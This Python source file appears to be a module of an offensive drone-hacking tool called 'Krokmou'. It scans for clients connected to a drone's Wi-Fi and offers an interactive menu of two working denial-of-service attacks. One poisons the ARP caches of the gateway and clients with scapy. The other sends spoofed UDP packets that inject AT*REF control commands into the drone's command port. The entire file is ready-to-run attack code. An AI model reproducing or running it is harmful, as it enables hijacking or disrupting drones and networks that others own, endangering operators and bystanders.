from scapy.all import *
from scan_clients import *
from time import sleep
import threading
import readchar

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m'

gateway_ip = "192.168.1.1"
srcPort = 5556
dstPort = 5556

continueArp = True

def arp_dos_menu():
    os.system("clear")
    print('\n{}ARP Spoofing DOS running \n'.format(GREEN))
    print('\t{}Tape S to stop the ARP DOS attack : \n'.format(GREEN))

def command_dos_menu():
    os.system("clear")
    print('\n{}Commands DOS running \n'.format(GREEN))
    print('\t{}Tape S to stop the Commands DOS attack : \n'.format(GREEN))

class ArpDosThread(threading.Thread):
    def __init__(self, list_of_client, gateway_mac):
        threading.Thread.__init__(self)
        self.list_of_client = list_of_client
        self.gateway_mac = gateway_mac

    def run(self):
        global continueArp, gateway_ip
        while continueArp:
            arp_dos_menu()
            for client in self.list_of_client:
                send(ARP(op=2, pdst=gateway_ip, hwdst=self.gateway_mac, psrc=client.ip))
                send(ARP(op=2, pdst=client.ip, hwdst=client.mac, psrc=gateway_ip))
            sleep(0.5)

class CommandDosThread(threading.Thread):
    def __init__(self, list_of_client, gateway_mac, iface):
        threading.Thread.__init__(self)
        self.list_of_client = list_of_client
        self.gateway_mac = gateway_mac
        self.iface = iface

    def run(self):
        global continueArp, gateway_ip
        payload = "AT*REF="+str(10000000000)+",290717696\r"
        while continueArp:
            command_dos_menu()
            for client in self.list_of_client:
                spoofed_packet = Ether(src=client.mac, dst=self.gateway_mac) / IP(src=client.ip, dst=gateway_ip) / UDP(sport=srcPort, dport=dstPort) / payload
                sendp(spoofed_packet, iface=self.iface)
            sleep(0.1)
        payload = "AT*REF="+str(1)+",290717696\r"
        for i in range(20):
            spoofed_packet = Ether(src=client.mac, dst=self.gateway_mac) / IP(src=client.ip, dst=gateway_ip) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=self.iface)
        sleep(0.1)

def menu():
    os.system("clear")

    print('\n{}Choose your DOS attack: \n'.format(GREEN))
    print('\t{}1{} - ARP Spoofing DOS !'.format(RED, GREEN))
    print('\t{}2{} - Commands DOS'.format(RED,GREEN))
    print('\n\t{}R{} - Return\n'.format(RED,GREEN))

def arp_dos(list_of_client, gateway_mac, iface):
    global continueArp
    continueArp = True
    arp_dos_thread = ArpDosThread(list_of_client, gateway_mac)
    arp_dos_thread.start()

    while True:
        arp_dos_menu()
        choice = readchar.readchar()

        if choice.upper() == 'S':
            continueArp = False
            break
        else:
            arp_dos_menu()

def command_dos(list_of_client, gateway_mac, iface):
    global continueArp
    continueArp = True
    command_dos_thread = CommandDosThread(list_of_client, gateway_mac, iface)
    command_dos_thread.start()

    while True:
        command_dos_menu()
        choice = readchar.readchar()

        if choice.upper() == 'S':
            continueArp = False
            break
        else:
            command_dos_menu()

def dos_main(drone, iface):
    gateway_mac = drone.bssid
    list_of_client = scanNetwork("192.168.1.2-10")  #return list of Class Object clients connected to the drone. Client define in scan_clients
    if len(list_of_client) >= 1:
        while True:
            menu()
            header = '{}Krokmou{} > '.format(GREEN,WHITE)
            choice = input(header)
            if choice.upper() == 'R' or choice.upper() == 'RETURN':
                break
            elif choice == '1':
                arp_dos(list_of_client, gateway_mac, iface)
            elif choice == '2':
                command_dos(list_of_client, gateway_mac, iface)
    else:
        print('\n{}Wait{}: Krokmou has no master. No DOS possible.\n'.format(RED,GREEN))
        print("\n{}Press ENTER to return to main menu...".format(GREEN))
        enter = input()
        os.system("clear")
